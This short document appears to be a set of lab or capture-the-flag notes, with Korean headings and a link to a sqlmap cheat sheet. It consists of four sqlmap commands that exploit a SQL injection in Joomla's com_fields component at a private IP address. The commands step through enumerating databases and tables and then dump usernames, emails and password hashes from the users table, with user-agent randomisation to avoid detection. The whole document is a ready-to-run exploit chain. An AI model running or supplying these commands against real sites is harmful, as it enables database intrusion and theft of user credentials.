
https://mahim-firoj.medium.com/sqlmap-cheat-sheet-15fe7fff2e8c

```bash title="db 추출"
sqlmap -u "http://10.201.19.63/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs
```

```bash "table 추출"
sqlmap -u "http://10.201.19.63/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla --tables
```

```bash title="column 추출"
sqlmap -u "http://10.201.19.63/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump
```

```bash title="data 추출"
sqlmap -u "http://10.201.19.63/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' -C id,name,username,email,password --dump
```

